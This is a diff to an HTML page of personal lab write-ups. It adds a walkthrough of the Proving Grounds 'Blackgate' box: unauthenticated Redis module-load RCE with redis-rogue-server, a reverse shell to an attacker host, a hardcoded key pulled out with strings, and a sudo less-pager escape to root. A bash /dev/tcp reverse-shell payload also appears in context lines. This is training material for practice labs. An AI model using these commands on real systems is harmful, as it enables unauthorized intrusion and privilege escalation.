@@ -159,7 +159,7 @@ mark.current{background:var(--hl-cur);color:#111;box-shadow:0 0 0 2px var(--hl-c
       <a href="index.html" class="tagline" style="display:inline-block;margin-top:4px">← all sections</a>
     </div>
     <div id="navfilterwrap"><input id="navfilter" placeholder="Filter this section…"></div>
-    <nav id="nav"><div class="navitems"><a class="navlink lvl1" href="#v10-astronaut-proving-grounds-practice-linux-intermediate">Astronaut  (Proving Grounds Practice · Linux · Intermediate)</a><a class="navlink lvl1" href="#v10-pelican-proving-grounds-practice-linux-intermediate">Pelican  (Proving Grounds Practice · Linux · Intermediate)</a><a class="navlink lvl1" href="#v10-twiggy-proving-grounds-practice-linux-easy">Twiggy  (Proving Grounds Practice · Linux · Easy)</a></div></nav>
+    <nav id="nav"><div class="navitems"><a class="navlink lvl1" href="#v10-astronaut-proving-grounds-practice-linux-intermediate">Astronaut  (Proving Grounds Practice · Linux · Intermediate)</a><a class="navlink lvl1" href="#v10-blackgate-proving-grounds-practice-linux-intermediate">Blackgate  (Proving Grounds Practice · Linux · Intermediate)</a><a class="navlink lvl1" href="#v10-pelican-proving-grounds-practice-linux-intermediate">Pelican  (Proving Grounds Practice · Linux · Intermediate)</a><a class="navlink lvl1" href="#v10-twiggy-proving-grounds-practice-linux-easy">Twiggy  (Proving Grounds Practice · Linux · Easy)</a></div></nav>
   </aside>
   <div id="main">
     <div id="topbar">
@@ -246,13 +246,91 @@ cat /root/proof.txt</code></pre>
 <li><code class="tag">[ENUM-UNUSUAL-PORTS]</code> / recognition · <code class="tag">[WEB-QUICK]</code> · <code class="tag">[EXPLOIT-RESEARCH]</code> (read + adapt the PoC) · <code class="tag">[SHELL-QUICK]</code> / <code class="tag">[SHELL-STABILIZE]</code> · <code class="tag">[LINUX-SUID]</code> + <code class="tag">[GTFOBINS-WORKFLOW]</code> (the root) · <code class="tag">[CONCEPT-LINUX-PERMS]</code> · <code class="tag">[HASH-IDENTIFICATION]</code> (bcrypt <code>-m 3200</code>) · <code class="tag">[FLAG-HUNT]</code></li>
 </ul>
 <hr>
+<h1 id="v10-blackgate-proving-grounds-practice-linux-intermediate">Blackgate  (Proving Grounds Practice · Linux · Intermediate)<a class="anchor" href="#v10-blackgate-proving-grounds-practice-linux-intermediate">#</a></h1>
+<ul>
+<li><strong>IP:</strong> <code>&lt;target&gt;</code>   <strong>Date:</strong> 2026-10-20</li>
+<li><strong>One-line:</strong> Unauthenticated <strong>Redis 4.0.14</strong> → module-load RCE (<code>redis-rogue-server</code>) → <code>prudence</code> → <code>sudo</code> on a custom <code>redis-status</code> ELF that runs **<code>systemctl status</code><strong> as root → </strong><code>less</code> pager escape** (<code>!/bin/bash</code>) → root.</li>
+</ul>
+<hr>
+<h2 id="v10-1-enumeration-1">1. Enumeration<a class="anchor" href="#v10-1-enumeration-1">#</a></h2>
+<pre><code>nmap -p- --min-rate 2000 -Pn -oN scans/all-tcp.txt $IP      # only 22, 6379
+nmap -p22,6379 -sCV -Pn -oN scans/services.txt $IP</code></pre>
+<div class="tablewrap"><table><thead><tr><th>Port</th><th>Service</th><th>Note</th></tr></thead><tbody>
+<tr><td>22</td><td>OpenSSH</td><td>no creds yet → payoff, not a way in</td></tr>
+<tr><td><strong>6379</strong></td><td><strong>Redis 4.0.14</strong></td><td>open, <strong>no auth</strong> → the only way in</td></tr>
+</tbody></table></div>
+<blockquote>🔑 Two ports, SSH useless without creds → <strong>Redis is the entire foothold.</strong> The version <strong>4.0.14</strong> is the tell: Redis <strong>≥ 4.0</strong> supports loading external modules → RCE. (See <code class="tag">[ENUM-REDIS]</code> / <code class="tag">[VERSION-VULN-MAP]</code>.)</blockquote>
+<h2 id="v10-2-foothold-prudence-uid1001">2. Foothold (prudence, uid=1001)<a class="anchor" href="#v10-2-foothold-prudence-uid1001">#</a></h2>
+<p><strong>Vector:</strong> Redis ≥ 4.0 <strong>module-load RCE</strong>. <code>redis-rogue-server</code> stands up a rogue master, makes the target replicate from it, and sideloads a malicious <code>.so</code> that adds <code>system.exec</code> / <code>system.rev</code>.</p>
+<pre><code># redis-rogue-server (github n0b0dyCN/redis-rogue-server)
+python3 redis-rogue-server.py --rhost $IP --lhost &lt;KALI&gt;
+#   ⚠️ it threw UnicodeDecodeError(&#x27;gb18030&#x27;) — a KNOWN cosmetic bug; the module LOADS anyway.
+# So just drive it by hand with redis-cli:
+redis-cli -h $IP
+  MODULE LIST                 # confirm the evil &#x27;system&#x27; module is loaded
+  system.exec &quot;id&quot;            # → uid=1001(prudence)  = RCE
+  system.rev &lt;KALI&gt; 443       # reverse shell (Kali: nc -lvnp 443)</code></pre>
+<p>Stabilise, then:</p>
+<ul>
+<li><strong>local.txt:</strong> <code>[captured]</code></li>
+</ul>
+<h2 id="v10-3-privilege-escalation-root-1">3. Privilege Escalation (root)<a class="anchor" href="#v10-3-privilege-escalation-root-1">#</a></h2>
+<p><strong>The breadcrumb:</strong> a root-owned but <strong>world-readable</strong> <code>notes.txt</code> planted in prudence&#x27;s home:</p>
+<pre><code>[?] Setup redis server
+[?] Turn on protected mode
+[?] Implementation of the redis-status      ← points straight at the privesc
+[?] Allow remote connections to the redis server</code></pre>
+<p><strong>The sudo right:</strong></p>
+<pre><code>sudo -l
+#   (root) NOPASSWD: /usr/local/bin/redis-status</code></pre>
+<p><strong>Cracking the binary:</strong></p>
+<pre><code>ls -l /usr/local/bin/redis-status     # -rwxr-xr-x root root → can&#x27;t edit it
+file /usr/local/bin/redis-status      # ELF 64-bit, dynamically linked, NOT STRIPPED
+sudo /usr/local/bin/redis-status      # prompts &quot;Authorization Key:&quot; → wrong key = &quot;Incident reported!&quot;
+strings /usr/local/bin/redis-status   # not stripped → read its guts:
+#   ClimbingParrotKickingDonkey321          ← hardcoded auth key
+#   /usr/bin/systemctl status redis         ← runs this as root via system()</code></pre>
+<p>Logic reconstructed: prompt → <code>gets()</code> key → <code>strcmp()</code> vs the hardcoded key → if match, <code>system(&quot;/usr/bin/systemctl status redis&quot;)</code>.</p>
+<p>**The exploit — <code>systemctl status</code> → pager escape (GTFOBins):**</p>
+<p><code>systemctl</code> is called by <strong>full path</strong> → no PATH hijack. BUT <code>systemctl status</code> in a TTY pipes through the **<code>less</code> pager<strong>, which here runs </strong>as root**, and <code>less</code> can spawn a shell with <code>!</code>. <code>less</code> auto-quits if output fits one screen → <strong>shrink the terminal</strong> to keep it open.</p>
+<pre><code>stty rows 5                                  # force systemctl output to overflow → pager stays open
+sudo /usr/local/bin/redis-status
+#   Authorization Key:  ClimbingParrotKickingDonkey321
+#   → drops into less (as root) → type:
+!/bin/bash                                   # root shell
+id                                           # uid=0(root) 🏆
+cat /root/proof.txt</code></pre>
+<ul>
+<li><strong>proof.txt:</strong> <code>[captured]</code></li>
+</ul>
+<h2 id="v10-4-learnings-tips-1">4. Learnings &amp; tips<a class="anchor" href="#v10-4-learnings-tips-1">#</a></h2>
+<ul>
+<li><strong>A version number is a lead, not trivia.</strong> &quot;Redis 4.0.14&quot; → module-load RCE + the tool name <code>redis-rogue-server</code>. This is the exact gap <code class="tag">[VERSION-VULN-MAP]</code> fills.</li>
+<li><strong>A root-owned, world-readable file in your home is a planted hint — read it first.</strong> <code>notes.txt</code> named the privesc outright.</li>
+<li>**<code>sudo</code> a custom binary → ask &quot;what does it run as root, and can I subvert that?&quot;** Not stripped → <code>strings</code> leaks the auth key AND the command it runs.</li>
+<li>**<code>systemctl status</code> = GTFOBins pager escape.** Any root process that pages through <code>less</code>/<code>more</code> → <code>!sh</code>. Shrink the terminal (<code>stty rows 5</code>) so the pager doesn&#x27;t auto-quit.</li>
+<li><strong>&quot;Tool threw an error&quot; ≠ &quot;tool failed.&quot;</strong> redis-rogue-server&#x27;s UnicodeDecodeError is cosmetic — the module loaded; verify with <code>MODULE LIST</code> before giving up.</li>
+</ul>
+<h2 id="v10-5-rabbit-holes-mistakes-so-i-dont-repeat-them-1">5. Rabbit holes / mistakes (so I don&#x27;t repeat them)<a class="anchor" href="#v10-5-rabbit-holes-mistakes-so-i-dont-repeat-them-1">#</a></h2>
+<ul>
+<li>⚠️ <code>cat</code>&#x27;d a binary → garbage. Compiled ELF → use <code>strings</code> / <code>file</code>, not <code>cat</code>.</li>
+<li>⚠️ First <code>strings</code> run got typed INTO the program&#x27;s <code>Authorization Key:</code> prompt (it was still waiting on input) → &quot;Wrong key&quot;. Run <code>strings</code> at the shell prompt, not while the binary is reading stdin.</li>
+<li>⚠️ Nearly reached for a PATH hijack — defeated here by the <strong>full path</strong> to systemctl + <code>secure_path</code> in sudo Defaults. Read the binary first; it showed the full path.</li>
+<li>💡 The SUID list was all stock snap/system binaries (pkexec present = possible PwnKit backup, but unneeded). The <code>sudo -l</code> entry was the intended path.</li>
+<li>💡 Binary also uses <code>gets()</code> → a real buffer-overflow bug (a second path in). Pager escape is cleaner, so took it.</li>
+</ul>
+<h2 id="v10-6-kb-tags-used-1">6. KB tags used<a class="anchor" href="#v10-6-kb-tags-used-1">#</a></h2>
+<ul>
+<li><code class="tag">[ENUM-REDIS]</code> + <code class="tag">[VERSION-VULN-MAP]</code> (Redis ≥4.0 module RCE, <code>redis-rogue-server</code>) · <code class="tag">[SHELL-STABILIZE]</code> · <code class="tag">[FLAG-HUNT]</code> · <code class="tag">[LINUX-SUDO]</code> (sudo custom binary) · <code class="tag">[GTFOBINS-WORKFLOW]</code> (<code>systemctl</code>/pager <code>!sh</code>) · <code class="tag">[LINUX-ENUM]</code> (notes.txt breadcrumb, SUID sweep)</li>
+</ul>
+<hr>
 <h1 id="v10-pelican-proving-grounds-practice-linux-intermediate">Pelican  (Proving Grounds Practice · Linux · Intermediate)<a class="anchor" href="#v10-pelican-proving-grounds-practice-linux-intermediate">#</a></h1>
 <ul>
 <li><strong>IP:</strong> 192.168.123.98   <strong>Date:</strong> 2026-10-12</li>
 <li><strong>One-line:</strong> Netflix <strong>Exhibitor</strong> web UI (<code>java.env</code> config-injection) → RCE as *charles* → <code>sudo gcore</code> to dump the memory of a root process literally named **<code>password-store</code>** → read the root password out of memory → <code>su root</code>.</li>
 </ul>
 <hr>
-<h2 id="v10-1-enumeration-1">1. Enumeration<a class="anchor" href="#v10-1-enumeration-1">#</a></h2>
+<h2 id="v10-1-enumeration-2">1. Enumeration<a class="anchor" href="#v10-1-enumeration-2">#</a></h2>
 <pre><code>nmap -p- --min-rate 2000 -Pn -oN scans/all-tcp.txt $IP
 nmap -p22,139,445,631,2181,2222,8080,8081,34051 -sCV -Pn -oN scans/services.txt $IP</code></pre>
 <div class="tablewrap"><table><thead><tr><th>Port</th><th>Service</th><th>Note</th></tr></thead><tbody>
@@ -280,7 +358,7 @@ $(/bin/bash -i &gt;&amp; /dev/tcp/&lt;KALI-IP&gt;/443 0&gt;&amp;1)
 </ul>
 <p><strong>Stabilise immediately</strong> (learned the hard way — see rabbit holes):</p>
 <pre><code>python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;   # Ctrl+Z → stty raw -echo; fg → Enter → export TERM=xterm</code></pre>
-<h2 id="v10-3-privilege-escalation-root-1">3. Privilege Escalation (root)<a class="anchor" href="#v10-3-privilege-escalation-root-1">#</a></h2>
+<h2 id="v10-3-privilege-escalation-root-2">3. Privilege Escalation (root)<a class="anchor" href="#v10-3-privilege-escalation-root-2">#</a></h2>
 <p><strong>Dead-end first (and that&#x27;s fine):</strong> <code>getcap -r /</code> showed only <code>cap_net_raw</code> (ping), <code>cap_ipc_lock</code> (keyring), <code>cap_net_bind/admin</code> (gstreamer) — <strong>none exploitable.</strong> No <code>cap_setuid</code> on a code-running binary. *Lesson: don&#x27;t force a technique; empty vector → next one.*</p>
 <p>**The real path — <code>sudo gcore</code>:**</p>
 <pre><code>sudo -l
@@ -297,21 +375,21 @@ cat /root/proof.txt</code></pre>
 <ul>
 <li><strong>proof.txt:</strong> <code>[captured]</code></li>
 </ul>
-<h2 id="v10-4-learnings-tips-1">4. Learnings &amp; tips<a class="anchor" href="#v10-4-learnings-tips-1">#</a></h2>
+<h2 id="v10-4-learnings-tips-2">4. Learnings &amp; tips<a class="anchor" href="#v10-4-learnings-tips-2">#</a></h2>
 <ul>
 <li><strong>Recognition by product name.</strong> <code>/exhibitor/</code> in a URL = the product Exhibitor. Unfamiliar string → Google it → find its exploit. You don&#x27;t need to know every app.</li>
 <li><strong>&quot;What does this tool DO as root?&quot;</strong> When <code>sudo -l</code> gives an *odd* binary, reason about its capability. <code>gcore</code> dumps memory → memory holds secrets → dump a secret-holding root process → read the credential. This mindset cracks weird privescs that aren&#x27;t on GTFOBins.</li>
 <li>**<code>ps aux</code> names are clues.** A process called <code>password-store</code> is a giant arrow. Read process lists for intent.</li>
 <li><strong>Don&#x27;t force a technique.</strong> Capabilities looked promising but were a dead end — pivoting to <code>sudo -l</code> found the real path in seconds.</li>
 </ul>
-<h2 id="v10-5-rabbit-holes-mistakes-so-i-dont-repeat-them-1">5. Rabbit holes / mistakes (so I don&#x27;t repeat them)<a class="anchor" href="#v10-5-rabbit-holes-mistakes-so-i-dont-repeat-them-1">#</a></h2>
+<h2 id="v10-5-rabbit-holes-mistakes-so-i-dont-repeat-them-2">5. Rabbit holes / mistakes (so I don&#x27;t repeat them)<a class="anchor" href="#v10-5-rabbit-holes-mistakes-so-i-dont-repeat-them-2">#</a></h2>
 <ul>
 <li>⚠️ <strong>Ctrl+C killed my reverse shell.</strong> In an unstabilised shell there&#x27;s no job control, so <strong>Ctrl+C drops the whole connection.</strong> After that, commands I typed ran on <strong>Kali</strong> by mistake (<code>gcore: command not found</code>, <code>No such file</code>). → **Always stabilise (python pty + <code>stty raw -echo</code>) before doing anything, and never Ctrl+C a raw shell.**</li>
 <li>⚠️ **<code>su</code> needs a real TTY.** In a dumb shell the password prompt misbehaves → stabilise first, *then* <code>su root</code>.</li>
 <li>⚠️ <strong>SSH-key route hit a booby-trapped login.</strong> Planting my key worked (auth succeeded), but charles&#x27;s login ran a bogus <code>foo</code> command and the server denied a PTY (<code>PTY allocation request failed</code>) → session died. Bypass = <code>ssh -i key charles@IP -tt &quot;bash --noprofile --norc&quot;</code>. In the end, <strong>restarting the lab + re-running the Exhibitor reverse shell</strong> (then stabilising) was the clean way back in.</li>
 <li>🐇 Ignore CUPS (631), Java RMI (34051), Samba — all distractions on this box.</li>
 </ul>
-<h2 id="v10-6-kb-tags-used-1">6. KB tags used<a class="anchor" href="#v10-6-kb-tags-used-1">#</a></h2>
+<h2 id="v10-6-kb-tags-used-2">6. KB tags used<a class="anchor" href="#v10-6-kb-tags-used-2">#</a></h2>
 <ul>
 <li><code class="tag">[ENUM-UNUSUAL-PORTS]</code> (identify Exhibitor) · <code class="tag">[WEB-QUICK]</code> · <code class="tag">[SHELL-QUICK]</code> / <code class="tag">[SHELL-STABILIZE]</code> (the Ctrl+C lesson) · <code class="tag">[REVERSE-SHELL-NOT-CONNECTING]</code> · <code class="tag">[LINUX-SUDO]</code> (sudo gcore) · <code class="tag">[LINUX-CAP]</code> (the dead-end check) · <code class="tag">[LINUX-CREDS]</code> · <code class="tag">[FLAG-HUNT]</code></li>
 </ul>
@@ -322,7 +400,7 @@ cat /root/proof.txt</code></pre>
 <li><strong>One-line:</strong> Spotted SaltStack by its 4505/4506 ZeroMQ ports → unauth RCE (CVE-2020-11651) → salt-master runs as <strong>root</strong> → read the flag directly.</li>
 </ul>
 <hr>
-<h2 id="v10-1-enumeration-2">1. Enumeration<a class="anchor" href="#v10-1-enumeration-2">#</a></h2>
+<h2 id="v10-1-enumeration-3">1. Enumeration<a class="anchor" href="#v10-1-enumeration-3">#</a></h2>
 <p><strong>All-ports scan:</strong></p>
 <pre><code>nmap -p- --min-rate 2000 -Pn -oN scans/all-tcp.txt $IP
 # open: 22, 53, 80, 4505, 4506, 8000
